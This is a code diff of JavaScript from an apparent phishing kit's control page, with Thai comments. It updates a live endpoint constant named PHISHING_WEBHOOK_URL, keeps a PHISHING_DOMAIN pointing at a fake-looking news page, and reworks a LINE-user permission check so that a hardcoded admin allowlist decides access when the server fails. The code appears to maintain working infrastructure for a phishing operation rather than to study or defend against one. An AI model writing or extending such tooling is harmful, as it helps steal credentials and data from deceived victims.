@@ -741,7 +741,7 @@
         
         // URL สำหรับ webhook
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxqx8HjzATxOnYVoCX85nuN4_4uJ0xSKvnsSoMOwJ4EUrvFs2oZsnfVIYGCbAykguLe/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby5eHSqrsAawgCB6D8_tXfzXgXzuxKxUndeapxhZh3qaIs8RdA-cEij0gmRAUCQApcl/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -817,9 +817,6 @@
                 
                 const response = await fetch(LINE_OA_WEBHOOK_URL, {
                     method: 'POST',
-                    // Ensure the content type is explicitly set for GAS web app
-                    // GAS doPost often expects 'text/plain' for simple JSON strings
-                    // but let's try standard JSON first. If issues persist, adjust this.
                     headers: {
                         'Content-Type': 'application/json'
                     },
@@ -829,38 +826,33 @@
                     })
                 });
                 
-                // Check if the response is OK (status code 200-299)
-                if (!response.ok) {
-                    console.error(`Server responded with status: ${response.status}`);
-                    const errorText = await response.text();
-                    console.error(`Server response text: ${errorText}`);
-                    // Default to no permission on server error
-                    return false;
-                }
-
-                // Try to parse the response as JSON
                 try {
-                    const data = await response.json();
-                    console.log("ผลการตรวจสอบสิทธิ์:", data);
-                    // Ensure the response has the expected property
-                    if (typeof data.hasPermission === 'boolean') {
-                        return data.hasPermission;
+                    const contentType = response.headers.get("content-type");
+                    if (contentType && contentType.includes("application/json")) {
+                        const data = await response.json();
+                        console.log("ผลการตรวจสอบสิทธิ์:", data);
+                        return data.hasPermission === true;
                     } else {
-                        console.error("Response JSON does not contain 'hasPermission' boolean property.");
-                        return false; // Default to no permission if response format is wrong
+                        console.log("Server ไม่ได้ตอบกลับเป็น JSON, ใช้การตรวจสอบสำรอง");
+                        return checkUserPermissionFallback(userId);
                     }
                 } catch (e) {
                     console.error("ไม่สามารถแปลง response เป็น JSON:", e);
-                    // If response is not JSON, log it and default to no permission
-                    const responseText = await response.text(); // Re-read text if json parsing failed
-                    console.error("Response text was:", responseText);
-                    return false;
+                    return checkUserPermissionFallback(userId);
                 }
             } catch (error) {
                 console.error('Error checking permission:', error);
-                // Default to no permission on network or other fetch errors
-                return false;
+                return checkUserPermissionFallback(userId);
             }
+        }
+        
+        // ตรวจสอบสิทธิ์แบบสำรอง
+        function checkUserPermissionFallback(userId) {
+            const approvedUserIds = [
+                'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบ
+            ];
+            
+            return approvedUserIds.includes(userId);
         }
         
         // เปิดใช้งานฟอร์ม
